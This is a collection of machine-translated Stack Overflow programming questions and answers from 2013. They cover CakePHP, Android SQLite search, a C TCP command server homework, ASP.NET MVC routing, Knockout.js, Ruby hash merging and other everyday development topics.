*   Teamcity - it has built in support for nuget that integrates and works well with teamcity but it (version 7.1.4) does not support all native nuget operations like managing packages from outside teamcity and there is no easy way to proxy other feeds nor support for multiple feeds. [http://jetbrains.com/teamcity](http://jetbrains.com/teamcity)

# cakephp-2.0 - 何时不在 CakePhp 2.x 中使用可包含行为

> ID：15562128
> 
> 赞同：4
> 
> 时间：2013-03-22T03:19:57.300
> 
> 标签：cakephp-2.0, containable

在向我的各种模型类添加了几次 Containable Behavior 之后，我有一个好主意，只需将行放入 AppModel 中，从而使每个模型都可以包含。这让我想知道，是否存在不希望或适得其反的特定模型具有可包含行为的情况？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-22T10:07:38.130

我会说太少而不必担心。我将可包含在 App Model 中：

```
class AppModel extends Model {
    public $recursive = -1;
    public $actsAs = array('Containable');

} 
```

无论如何，可包含覆盖递归，因此您实际上不需要将递归设置为-1，但我这样做只是为了清楚起见。始终使用可包含的内容会迫使您进入始终仅使用您想要/需要的内容的最佳实践。对于小型应用程序，仅使用递归并忽略可包含并不是世界末日，但这仍然不是最佳实践。

所以，我想使用递归而不是可包含的唯一理由是，在小型应用程序中，您可以为自己节省少量的开发时间，并且不会真正显着影响性能。我肯定会默认使用可包含的，并在您认为过分的地方将其删除，而不是相反。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-11T15:53:37.580

为了获得嵌套结果，可包含可能是危险的 b/c Cake 以极其低效的方式行事。

这个网站解释得很好...

[http://www.endyourif.com/cakephp-containable-statement-pitfalls/](http://www.endyourif.com/cakephp-containable-statement-pitfalls/)

基本上，虽然您得到的漂亮数组是许多不同查询的结果，而您的最佳性能可能来自使用带有连接的单个查询。

不过，containable 的便利性是不可否认的。

# iscroll - iOS6中使用iscroll和jqmobi闪烁的Webapp

> ID：15562131
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:20:07.233
> 
> 标签：iscroll, jqmobi

我的 web 应用程序使用两个 javascript 框架：iscroll 和 jqmobi。但是当app加载一大段内容到html页面时，iOS6中的画面会闪烁。我很困惑是什么导致了这个问题，如果它与上述两个js框架有关，哪个应该承担主要责任？有没有什么办法可以让闪烁永远不会发生？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-25T17:52:07.353

[从 iScroll http://cubiq.org/you-shall-not-flicker](http://cubiq.org/you-shall-not-flicker)查看这篇文章。我在使用它时遇到了同样的问题，发现将 -webkit-transform:translate3d(0,0,0) 应用于可滚动的元素解决了我的闪烁问题。谨慎使用它，因为它确实对性能有影响。

```
#someDiv {
-webkit-transform:translate3d(0,0,0);
} 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-24T19:34:21.430

使用 jqmobi 的内置滚动库，默认厨房水槽示例不会闪烁。迹象表明 iScroll 导致了问题。

# compiler-construction - 所有程序都可以转换为单一作业形式吗？

> ID：15562132
> 
> 赞同：0
> 
> 时间：2013-03-22T03:20:09.270
> 
> 标签：compiler-construction, compiler-optimization

单一赋值形式在编译器中广泛用于代码优化。但是，无论是否将所有程序都转换为单一分配形式，我都找不到任何专门写的地方。如果可能，请指导我查看该材料，否则请提供反例。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-20T09:31:54.347

我询问了 ACM TODAES 2007 的“实用动态单一分配转换”的作者，他们确认应用单一分配表确实存在局限性。例如，运输问题的解决方案（来自运筹学 - [链接](http://orms.pef.czu.cz/text/transProblem.html "关联")）无法转换，因为它们的执行取决于数据相关的成本矩阵。然而，作者还提到，可以根据架构限制等应用预定义的循环边界，使其适合单一分配形式。

# java - java JFrame 调整大小

> ID：15562133
> 
> 赞同：0
> 
> 时间：2013-03-22T03:20:14.567
> 
> 标签：java, swing, jframe, componentlistener

我的项目中有以下代码段。

```
someJFrame.addComponentListener(new ComponentAdapter(){  
    public void componentResized(ComponentEvent e) {
    pane.resize(new Dimension(getSize().width/5, getSize().height/3));
    pane.revalidate();
    pane.repaint();
    }
}); 
```

似乎在第一次初始化 JFrame 时就在开始时调用了 componentResized() 方法，即使用户没有调整 JFrame 的大小——我需要防止这种情况发生。我只希望在发生真正的调整大小时调用 componetResized() ，而不是在 JFrame 初始化时调用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T07:50:06.000

这是要走的路-

1.  定义一个布尔标志来指示组件是否显示，默认为 false
2.  覆盖 componentShown() 并将此标志设置为 true，当框架可见时调用此标志
3.  在 componentResized() 检查是否设置了 componentShown 标志，然后才做一些事情

像这样的东西-

```
 private boolean componentShown = false; // instance variable

    someJFrame.addComponentListener(new ComponentAdapter() {
        public void componentResized(ComponentEvent e) {
            if(componentShown) {
               System.out.println("Component RESIZED");
            }  
        }

        public void componentShown(ComponentEvent e) {
            componentShown = true;
        }
    }); 
```

# java - 如何使搜索在 Android 中工作

> ID：15562136
> 
> 赞同：1
> 
> 时间：2013-03-22T03:20:22.600
> 
> 标签：java, android, android-sqlite

我有以下代码可以正常工作..我想添加一个搜索功能...你能告诉我我应该做什么以及在哪里

我的数据库.java

```
package com.example.test4;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class MyDatabase {
    public static final String MY_DB2 = "testdb5";
    MyHelper mh;
    Context myCon;
    SQLiteDatabase sdb;

    public MyDatabase(Context c) {
        myCon = c;
        mh = new MyHelper(myCon, MY_DB2, null, 1);
    }

    public void open() {
        sdb = mh.getWritableDatabase();
    }

    public class MyHelper extends SQLiteOpenHelper {

        public MyHelper(Context context, String name, CursorFactory factory,
                int version) {
            super(context, name, factory, version);
            // TODO Auto-generated constructor stub
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("create table students(_id integer primary key, "
                    + "s_name text, " + "s_attendance text, "
                    + "s_homework text, " + "s_participation text, "
                    + "s_quiz integer, " + "s_test integer, "
                    + "s_comment text, " + "p_email text);");
            Log.d("1", "Table Created");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            // TODO Auto-generated method stub

        }

    }

    public void StudentsInsert(ContentValues cv) {
        sdb.insert("students", null, cv);
    }

    public Cursor getStudents() {
        Cursor c = sdb.query("students", null, null, null, null, null, null);
        return c;
    }

    public Cursor filterStudents() {
        // SQLiteDatabase db = mh.getReadableDatabase();

        Cursor c = sdb.query("students", new String[] { "s_name",
                "s_attendance", "s_homework", "s_participation", "s_quiz",
                "s_test", "s_comment", "p_email" }, "s_name like %a%", null,
                null, null, null);
        return c;

    }

} 
```

我认为我在 filterStudents() 中做错了什么......

这就是我在其他文件中的内容

```
EditText myFilter = (EditText) findViewById(R.id.myFilter);
        myFilter.addTextChangedListener(new TextWatcher() {

         public void afterTextChanged(Editable s) {
         }

         public void beforeTextChanged(CharSequence s, int start, 
           int count, int after) {
         }

         public void onTextChanged(CharSequence s, int start, 
           int before, int count) {
          sca.getFilter().filter(s.toString());
         }
        });

        sca.setFilterQueryProvider(new FilterQueryProvider() {
               public Cursor runQuery(CharSequence constraint) {
                   return mdb.filterStudents();
               }
           }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:27:08.230

尝试在过滤器字符串周围加上引号。即，而不是：

```
like %a% 
```

做了：

```
like '%a%' 
```

保持双引号 (") 保持原样，但在过滤器字符串周围添加单引号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:52:41.457

我正在使用这种方式可能对你有帮助。

创建用于将数据设置到列表视图的适配器。

创建用于显示数据的列表视图。

```
myFilter.addTextChangedListener(new TextWatcher() {         
    @Override
    public void onTextChanged(CharSequence s, int start, int before, int count){                                
      myadapter.getFilter().filter(s);
      listview.setAdapter(myadapter);    
      myadapter.notifyDataSetChanged(); 
}

MyDatabase mdb = new MyDatabase(this);
//set adapter as per requirement this is sample.
myadapter= new MySimpleCursorAdapter(this, R.layout.list_search, m_curContacts, fields, new int []{R.id.textView1,R.id.imageView1});
    myadapter.setFilterQueryProvider(new FilterQueryProvider() {            
    public Cursor runQuery(CharSequence constraint) {
        //check here cursor is getting any result or not.if not then problem with your query.   
            return mdb.filterStudents();
    }

}); 
```

您必须`"'%"+ value+ "%'"`在数据库中使用这种方式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T15:38:41.147

我找到了解决问题的方法..我想分享这个..

我的代码看起来像这样

```
EditText myFilter = (EditText) findViewById(R.id.myFilter);
        myFilter.addTextChangedListener(new TextWatcher() {

         public void afterTextChanged(Editable s) {
         }

         public void beforeTextChanged(CharSequence s, int start, 
           int count, int after) {
         }

         public void onTextChanged(CharSequence s, int start, 
           int before, int count) {
          sca.getFilter().filter(s.toString());
         }
        });

        sca.setFilterQueryProvider(new FilterQueryProvider() {
               public Cursor runQuery(CharSequence constraint) {
                   return mdb.fetchMyValues(constraint.toString());
               }
           }); 
```

在我的数据库文件中，我添加了以下代码

```
public Cursor fetchMyValues(String inputText) {

        String DATABASE_TABLE="students";
        return sdb.query(DATABASE_TABLE, new String[] {"_id", "s_name",
                "s_attendance", "s_homework", "s_participation", "s_quiz",
                "s_test", "s_comment", "p_email"}, 
                  "s_name like '%" + inputText +"%'"  , null, null, null, null);} 
```

现在我的搜索效果很好......

谢谢

# php - 页面模板未从数据库中提取数据

> ID：15562138
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:20:43.683
> 
> 标签：php, wordpress, pdo

我制作了一个自定义页面模板，它将显示我完成短片制作的发布日期。我有一个使用它创建的页面，它会加载罚款。但是我已经在模板中放入了一个 PDO 数据库来提取数据。唯一的问题是它没有显示任何内容并且表中有数据。

```
try {
    $dbh = new PDO('mysql:host=localhost;dbname=wordpress','****','*****');
            $sql = "SELECT * from release";
            $q = $dbh->prepare($sql);
            $q->execute();

/*
Template Name: Test
 */

get_header(); ?>

    <div id="primary" class="site-content">
        <div id="content" role="main">
            <p align="center">
<?php while($row = $q->fetch()) { ?>
            <div id="name">
            <?php echo $row['name']; echo "hello"; ?>
            </div>
            <div id="site">
            <?php echo $row['site']; ?>
            </div>
            <div id="date">
            <?php echo $row['date']; ?>
            </div>      

 } ?>           
            </p>
        </div><!-- #content -->
    </div><!-- #primary -->
    <?php

} catch (PDOException $e) {
    print "Error from Dedicated Database!: " . $e->getMessage() . "<br/>";
    die();
}

 get_sidebar();
 get_footer(); ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T08:43:15.973

```
Add <?php 
```

在内容部分的最后一个`} ?>`内部之前，如下所示：

```
 </div>      
<?php
 } ?>           
            </p>
        </div><!-- #content -->
    </div><!-- #primary --> 
```

# .net - 我什么时候应该使用像 Math.NET 这样的线性代数库

> ID：15562140
> 
> 赞同：12
> 
> 时间：2013-03-22T03:20:58.190
> 
> 标签：.net, performance, math, linear-algebra, math.net

我不确定这个问题有一个正确的答案，但我们开始吧。虽然许多数值问题可以用线性代数形式表示，但从我有限的经验来看，使用 Math.NET 的简单操作比在原始数组上编写等效操作会产生性能开销。

作为一个测试用例，我编写了代码来计算一个向量和一个列表中最近的向量之间的距离，有 3 个版本：对数组进行操作，对密集向量进行操作，以及使用 MKL 提供程序对密集向量进行操作。处理数组比处理向量快 4 倍，比使用 MKL 提供程序快 3 倍。

缺点是我必须手动编写距离计算，而不是利用内置的 Norm 函数。好处是它更快。*注意：我没有发布代码，如果需要，我很乐意这样做，我也可能不正确地使用 Math.NET。*

所以我的问题如下：在我看来，使用更高级别的抽象是以性能为代价的。一般情况下是这样吗，还是在某些情况下（例如实例的稀疏矩阵），使用 Math.NET 的性能有望优于手动编写的数组操作？

如果是这种情况，我倾向于认为使用 Math.NET 的线性代数部分对于涉及矩阵的“真实”代数最有用，以避免重新实现更复杂的计算/算法，并可能提高代码的可读性，但对于更简单的逐个向量操作的操作，处理原始数组可能是一个更好的主意。

任何关于何时使用图书馆的好主意与何时应该推出自己的图书馆将不胜感激！

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-03-22T10:01:44.997

*免责声明：我正在维护 Math.NET Numerics。*

像 Math.NET Numerics 这样的工具包试图提供的主要价值是**开发人员的生产力**，特别是对于那些没有该主题的博士学位的人来说，他们将很难或浪费大量时间自己实现这些有时非常复杂的算法，甚至可能很糟糕 - 相反花时间在他们的实际问题上。

然后，您需要的功能可能已经被其他人使用过。他们中的一些人可能已经发现并指出了一些问题并回馈了他们的改进。**更多用户有助于提高代码质量和健壮性**。不幸的是，这也给我们带来了主要缺点：***它还倾向于使代码更通用，这通常使其效率低于完全满足您需要的高度专业化的实现。***

这与 Cody Gray 的评论一致：如果它可以工作并且足够快，请使用它，否则要么帮助修复它并使其工作（并且快速），要么选择另一个有效的工具包，或者自己实现你需要的东西。幸运的是，Math.NET Numerics 还有更多选项，见下文。

因此，我同意您的结论：如果您实际上不需要任何复杂的操作，请不要使用非常大的数据，但性能很重要，直接使用数组或其他数据结构没有任何问题（尤其是在 F# 中，我个人会比 C# 更频繁地考虑原始本机数据结构）。当然，这是以失去一些便利为代价的，并且当您开始需要更多操作时，您最终可能会重新实现工具包。最后，这还取决于这对您的项目有多重要，以及您是否可以花费资源和时间来维护自己的数学代码。

尽管如此，根据我自己的经验，*拥有*代码通常是一个优势（因此您可以进行更改，立即生效）并使其保持简单和专注（因此它完全可以完成您需要它做的事情并且仅此而已）。

## 特定于 Math.NET 数值

*   一个非常具体的托管实现总是可以胜过一般的托管实现。但是，**我们的托管实现不应比任何托管替代方案慢很多**。毕竟，我们的算法在内部也直接在数组上运行（如果经过适当优化）。如果另一种算法更快，似乎我们最好用那个替代方法替换我们的实现，所以请让我们知道它（或者更好地贡献更改）。
*   如果您碰巧找到了一条我们可以并确实利用**像 MKL 这样的本地提供程序**并且您处理大数据的路径，我希望 Math.NET 的**速度更快**，尽管抽象级别更高。
*   并非 Math.NET Numerics 中的所有代码路径都经过同等优化，或者利用本机提供程序。在过去的几个小版本中，线性代数已经投入了大量工作，所以我们正在变得更好，但速度很慢；还有很多工作要做（尤其是对于稀疏类型）。在您的情况下，您可能遇到了一些几乎没有优化的路径。**所以我实际上对你的代码示例非常感兴趣，所以我们可以处理这个特定的案例**。

## Math.NET 数值性能提示

*   使用本机提供程序
*   对 Control 类中的并行化设置进行一些实验（但请注意，我们已经意识到直到 v2.4 的并行化实现实际上非常糟糕，并计划在 v2.5 中完全替换它。第一个基准测试很有希望）
*   在实现自己的操作时尝试避免访问任何 At/indexer，而是直接访问原始数组（请参阅 .Storage）
*   许多操作允许指定结果向量/矩阵，有时甚至可以与操作数之一（就地）相同。避免在每次操作中创建新数组，从而在处理非常大的数据时降低内存压力。不幸的是，也让代码变得丑陋。

# bash - 编写倒数计时器脚本时出错

> ID：15562141
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:21:06.633
> 
> 标签：bash

```
hour_init=$((1)); 
min_init=$((30)); 
sec_init=$((00)); 
hour=$hour_init; 
min=$min_init; 
sec=$sec_init; 
while [ $hour -gt 0]; 
while [ $min -gt 0 ]; 
while [$sec -gt 0]; 
do clear; 
echo $sec | figlet; 
sleep 1; 
sec=$(($sec- 1)); 
done; 
sec=$sec_init; 
min=$(($min- 1)); 
done; 
hour=$($hour- 1); 
min=$min_init; 
sec=$sec_init; 
done; 
```

我写这篇文章是为了获得一个基于小时：分钟：秒的计时器。然而我做不到！我对 bash 脚本非常陌生。有人可以告诉我我在这里做错了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:32:52.273

`[`请注意 s 之后和 s 之前的空格`]`，如果您最初设置为 0，这将不会循环`sec`（因为您的循环在`sec`非正数时退出。另请注意以下`hour=$(($hour- 1))`位：

```
hour_init=1
min_init=60
sec_init=60
hour=$hour_init
min=30
sec=0
while [ $hour -gt 0 ] 
do
  while [ $min -gt 0 ]; do
    while [ $sec -gt 0 ] 
    do clear
      echo "$hour:$min:$sec"
      sleep 1
      sec=$(($sec- 1))
    done
    sec=$sec_init
    min=$(($min- 1))
  done
  hour=$(($hour- 1))
  min=$min_init
  sec=$sec_init
done 
```

# animation - 纯色背景上的动画透明预加载器图像

> ID：15562145
> 
> 赞同：9
> 
> 时间：2013-03-22T03:22:02.840
> 
> 标签：animation, transparency, animated-gif

我想在内容加载之前在我的网站上显示一个预加载器，但是当我选择具有透明背景的动画预加载器图像时，边缘看起来非常锯齿状。如何修改图像，或者有没有办法让动画 gif 具有透明背景？

我正在使用来自 preloader.net 的预加载器

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-06-20T10:33:37.343

您拥有的第一个可能也是最简单的选择是使用[spin.js](http://fgnass.github.io/spin.js)。“它动态创建旋转活动指示器，可用作与分辨率无关的 AJAX 加载 GIF 替代品。”</p>

* * *

如果脚本不是一个选项，或者您想要使用不同的微调器，则必须创建一个没有抗锯齿的 .gif，该 gif 大于您要使用的微调器并使用 html 将其缩小。

没有边缘的原始微调器（没有抗锯齿，因此它具有像素化边缘）：

> ![](../Images/12be50dbeff5fa2fe85a334a041ac2ec.png)

但如果这个微调器按比例缩小，它看起来不错：

> ![](../Images/12be50dbeff5fa2fe85a334a041ac2ec.png) ![](../Images/12be50dbeff5fa2fe85a334a041ac2ec.png)

请务必使用

```
img {
    -ms-interpolation-mode:bicubic;
} 
```

使它在旧的 IE 中也看起来很漂亮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-06T10:40:46.217

您可以使用帮助您生成微调器的网站。一个不错的选择是： [loading.io](https://loading.io/asset/369109)

# c - 具有重定向输出应用程序的 Linux C TCP 套接字客户端/服务器

> ID：15562150
> 
> 赞同：1
> 
> 时间：2013-03-22T03:22:55.980
> 
> 标签：c, linux, redirect, tcp

首先让我说这是操作系统课程的家庭作业，我不是程序员，尤其不是 C 语言。我已经在这工作了一个星期了，我只是卡住了，我需要帮助。我必须创建 TCP 客户端和服务器应用程序，其中将 linux 命令键入客户端，在服务器上执行并将输出重定向回客户端。我理解这个概念，我有 90+% 的工作。“ls”、“ls -lpq”、“cat somefile”、“man somecommand”等命令都可以正常工作。我遇到麻烦的地方是命令不返回任何信息，如“mkdir newdir”（如果目录已经存在，它可以正常工作，因为我得到了响应）。这对我来说是全新的，但在我看来，我的问题在于服务器的 recv 命令阻塞，因为没有信息可以接收。我不知道如何解决这个问题，我已经在这个问题上工作了一周。我的时间不多了，我还必须实现文件上传和下载，我不知道从哪里开始，但在我解决这个问题之前我什至无法开始工作。

谢谢

```
 // this is where I think the problem is
    while ((rcvd_bytes = recv(sock_fd, recv_str, sizeof(recv_str), 0)) > 0 ) {
        // Zero out the inputCopy buffer
        memset(&inputCopy, 0, sizeof(inputCopy)+1);

        // Copy the recv_str into a new string so that
        // we can work with it.
        strcpy(inputCopy, recv_str);

        argcount = parsecommand(inputCopy, args);

        //Send the message back to client
        dup2(sock_fd, 1);

        if((status = forkAndExecute(args)) != 0) {
            //printf("Command %s returned %d.\n", args[0], status);
        }

            // as a test is I uncomment the following line mkdir newdir
            // returns but the following commands are messed up - as I expect.
        //printf("\n");

        memset(&recv_str, 0, sizeof(recv_str)+1);
        fflush(stdout);
    }  

    if(rcvd_bytes == 0) {
    puts("Client disconnected");
    fflush(stdout);
    }
    else if(rcvd_bytes == -1) {
    perror("recv failed");
    exit(0);
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:32:45.163

听起来您需要使用[select](http://linux.die.net/man/2/select)。

```
if(select(fdmax+1, &my_fdset, 0, 0, NULL) > 0) // there is data available to be read
    recv(...) 
```

其中`fdmax`是最大的文件描述符（select 想要 +1）并且`my_fdset`是一个文件描述符集，您可以将文件描述符添加到 using `FD_SET(sockfd, &my_fdset);`.

这只会在有可用数据时接收。希望有帮助。

**编辑 ：**

当我编写一个简单的客户端/服务器程序以通过 TCP 套接字发送/接收字符串时，我问了一个类似的问题。[我在这里](https://stackoverflow.com/questions/15513588/c-pthreads-sending-and-recving-on-a-socket-worked-separately-but-not-togeth)发布了我最终在该线程上使用的代码。我的不同之处在于我想要一个程序来发送和接收，但是如果你看看我的发送者或接收者函数，你可能能够调整一些东西来让你的程序做你想做的事。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T03:38:43.593

鉴于您的问题描述，我怀疑是客户端代码而不是服务器代码 - 或者实际上是您在两者之间隐式创建的协议。

看起来您只是通过使用`dup2`将标准输出指向套接字将命令的输出直接发送回客户端。大概，客户端然后从套接字读取以获取命令的输出？当客户端向服务器发送命令然后没有得到回复时，客户端会做什么？像这样的命令`mkdir`不会发回任何东西。是否永远等待服务器发送命令输出？

一般来说，对于同步客户端/服务器协议（客户端发送命令，服务器在客户端发送另一个命令之前发送响应的协议），您必须在客户端和服务器之间就协议达成一致，以清楚地指示何时服务器完成发回数据，客户端应该发送下一个命令。您可能需要为服务器添加一些方法来告诉客户端命令已完成但未发送任何输出。

# asp.net-mvc - Mvc：传递 id 但不在友好的 url 中显示

> ID：15562152
> 
> 赞同：1
> 
> 时间：2013-03-22T03:22:58.803
> 
> 标签：asp.net-mvc, asp.net-mvc-3, friendly-url

我有一个呈现新闻列表的视图，因为我有一个 href 标记，我需要调用一个 Detail 方法并将新闻 id 传递给它，现在我的 url 中有一个查询字符串，例如 News/Details?id= x ...但我需要像新闻/详细信息/类别/标题之类的东西，一个带有新闻类别、名称且没有 id 的友好 url

这是我的操作，它有效，但我得到了那个查询字符串

```
foreach (var item in Model)
{
    <a href='@Url.Action("Details", "News", new { id = item.newsId, category = item.categoryName, name = item.newsName })' title=""> Read More </a>
} 
```

我正在尝试使用 Url.RouteUrl 之类的东西

```
 routes.MapRoute(
            name: "Details",
            url: "{controller}/{action}/{id}/{category}/{newsName}",
            defaults: new { controller = "News", action = "Details"}
        ); 
```

但它永远不会进入详细信息操作结果，而且我需要传递 id 参数来显示一些新闻详细信息，但我不想在友好的 url 中显示它。我真的很困惑如何实现它。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:23:24.137

尝试这个：

```
@Html.RouteLink("Read More", "Details", new { action = "Details", id = item.newsId, category = item.categoryName, newsName = item.newsName }) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T03:57:02.193

利用 ：

```
<a href='@Url.Action("Details", "News", new { id = item.newsId, category = item.categoryName, newsName = item.newsName })' title=""> Read More </a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T08:05:49.097

第一个网址正确

```
<a href='@Url.Action("Details", "News", new { id = item.newsId, category = item.categoryName, newsName = item.newsName })' title=""> Read More </a> 
```

每当您看到与路由相关的问题时，您都可以使用[Route Debugger](http://haacked.com/archive/2011/04/12/routedebugger-2.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T05:46:00.037

确保您的路线没有被其他路线覆盖。所以把你的路由先放在 RoutConfig.cs 中把你的代码改成：

```
foreach (var item in Model)
{
    <a href='@Url.Action("Details", "News", new { id = item.newsId, category = item.categoryName, newsName = item.newsName })' title=""> Read More </a>
}//change name=item.newsName to newsName=item.newsName 
```

还要确保您的控制器根据您的路由详细信息具有正确的签名：

```
public class NewsController : Controller
{
    public ActionResult Details(int id, string category, string newsName )
} 
```

# javascript - 如果值大于，则敲除 js 隐藏按钮

> ID：15562154
> 
> 赞同：3
> 
> 时间：2013-03-22T03:23:03.883
> 
> 标签：javascript, knockout.js

我在页面加载后定义一个变量（存储数字 json 数据）

我可以成功地将这个变量放入：

```
<span data-bind="text: extQty"></span> 
```

并且当变量更改时，它会使用适当的变量更新跨度（效果很好）。

但它不会在我的启用中更新我的变量：

```
<p class="pull-right"><a class="btn btn-primary" data-bind="click: $root.add, enable: pagedList().length < extQty" href="#" title="edit"><i class="icon-plus"></i> Add Extension</a></p> 
```

我需要根据呈现给“extQty”的值有效地禁用启用。现在我正在向 extQty 发送 5，并且似乎该变量仅在“文本”数据绑定内部更新，而不是“启用”数据绑定。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T07:13:57.313

敲除启用绑定**不适用于锚标记**。

所以你有两个解决方案。

**解决方案 1**

```
<a href='#' title="edit" class="btn btn-primary" data-bind='click: function() { 
 if(pagedList().length < extQty())
 {
    //call the desired method from here
 }' > 
```

**解决方案 2**

此按钮仅在您的条件成功且具有点击绑定时显示

```
<a class="btn btn-primary" data-bind="click: $root.add, visible: pagedList().length < extQty()" href="#" title="edit"> 
```

此按钮仅在您的否定条件成功且没有点击绑定时显示

```
<a class="btn btn-primary" data-bind="visible: pagedList().length >= extQty()" href="#" title="edit"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T07:55:26.320

尝试使用

```
<p class="pull-right">
    <a class="btn btn-primary" data-bind="style: { display: (pagedList().length < extQty) ? 'block' : 'none' }" 
        href="#" title="edit">
        <i class="icon-plus"></i>Add Extension
    </a>
</p> 
```

或者正如@NaveenKumar 所指出的那样。您可以使用可见属性...

# php - 使用javascript的xls文件中的行数

> ID：15562155
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:23:11.907
> 
> 标签：php, javascript

用户从输入文件标签中选择一个 xlsx 文件，我想在不提交表单的情况下获取 xlsx 文件中的行数。可以用javascript吗？如果是，那么请提供相同的帮助，如果不是，请告诉我另一种方法来做同样的事情。服务器端语言是 PHP。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:26:49.790

编辑：我之前的回答是完全错误的，所以我在这次编辑中删除了它。

作为一般解决方案，xls 文件是某种 zip 文件，因此您需要先解压缩文件。工作表和数据以 XML 格式存储在该文件中。那么您必须在该 zip 文件中找到正确的 XML 文件，然后对其进行解析。这并不容易，我不确定是否有可用的库。对于解压缩，请查看[http://gildas-lormeau.github.com/zip.js/demos/demo2.html](http://gildas-lormeau.github.com/zip.js/demos/demo2.html)，这里还有一个与 openoffice 文件相关的问题[Unzipping files](https://stackoverflow.com/questions/2095697/unzip-files-using-javascript)

另外，当然总是有一种使用 ActiveXObject 的虚拟方式 :)

# ruby - 根据 Ruby 中该键的值的数量在哈希中合并键值对的最佳方法

> ID：15562156
> 
> 赞同：1
> 
> 时间：2013-03-22T03:23:26.643
> 
> 标签：ruby, arrays, ruby-on-rails-3, hash, key

我在 ruby​​ 中有一个数组哈希：

```
 @people = { "a" => ["john", "mark", "tony"], "b"=> ["tom","tim"], 
            "c" =>["jane"], "others"=>["rob", "ryan"] } 
```

我想合并特定键值的数组中少于 3 个项目的所有键值对。它们应该被合并到名为“others”的键中，以大致给出以下结果

```
 @people = { "a" => ["john", "mark", "tony"], 
           "others"=> ["rob", "ryan", "tom", "tim", "jane"] } 
```

使用以下代码是有问题的，因为哈希中不能存在重复的键值：

```
 @people = Hash[@people.map{|k,v| v.count<3 ? ["others",v] : [k,v]} ] %> 
```

优雅地解决这个问题的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T04:16:05.190

您几乎拥有它，问题是，正如您所注意到的，由于重复，您无法即时构建哈希的键/值对。解决此问题的一种方法是从您要构建的框架开始：

```
@people = @people.each_with_object({ 'others' => [ ] }) do |(k,v), h|
    if(v.length >= 3)
        h[k] = v
    else
        h['others'] += v
    end
end 
```

或者，如果你不喜欢`each_with_object`，你可以：

```
h = { 'others' => [ ] }
@people.each do |k, v|
    # as above
end
@people = h 
```

或者你可以使用几乎相同的结构`inject`（像往常一样注意从块中返回正确的东西）。

当然还有其他方法可以做到这一点，但这些方法非常清晰易懂；IMO 清晰度应该是您的首要目标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T06:50:10.387

```
Hash[ @people.group_by { |k,v| v.size < 3 ? 'others' : k }.
              map { |k,v| [k, v.flat_map(&:last)] } ]

=> {"a"=>["john", "mark", "tony"],
    "others"=>["tom", "tim", "jane", "rob", "ryan"]} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T05:38:36.830

尝试：

```
>> @people = { "a" => ["john", "mark", "tony"], "b"=> ["tom","tim"], 
        "c" =>["jane"], "others"=>["rob", "ryan"] }

>> @new_people = {"others" => []}

>> @people.each_pair {|k,v| (v.size >= 3 && k!="others") ? @new_people.merge!(k=>v) : @new_people['others']+= v}    

>> @new_people
=> {"others"=>["rob", "ryan", "jane", "tom", "tim"], "a"=>["john", "mark", "tony"]} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:22:22.187

```
@people[:others] = []
@people.each do |k, v|
  @people[:others] |= @people.delete(k) if v.size < 3
end 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-22T04:27:09.030

```
@people.inject({}) do |m, (k, v)|
  m[i = v.size >= 3 ? k : 'others'] = m[i].to_a + v
  m
end 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-22T04:16:18.053

那这个呢：

```
> less_than_three, others = @people.partition {|(key, values)| values.size >= 3 }
> Hash[less_than_three]
# => {"a"=>["john", "mark", "tony"]}
> Hash["others" => others.map {|o| o.last}.flatten]
# => {"others"=>["tom", "tim", "jane", "rob", "ryan"]} 
```

# c# - 错误：使用实体框架从数据库更新模型

> ID：15562157
> 
> 赞同：0
> 
> 时间：2013-03-22T03:23:29.500
> 
> 标签：c#, mysql, entity-framework, asp.net-mvc-2, model

我在数据库中添加了一个新表，其中包含几何类型的列。我正在使用带有 SP1 的 VS10。我将我的实体框架更新为 Microsoft Entity Framework June 2011 CTP，因为早期版本的几何类型列不受支持。
现在我在 MyProject.Data 中自动生成 MyDbContext.cs 时收到以下错误“模型中不存在 EntityContainer，因此没有生成代码”。可能是什么问题呢 ？任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：0
> 
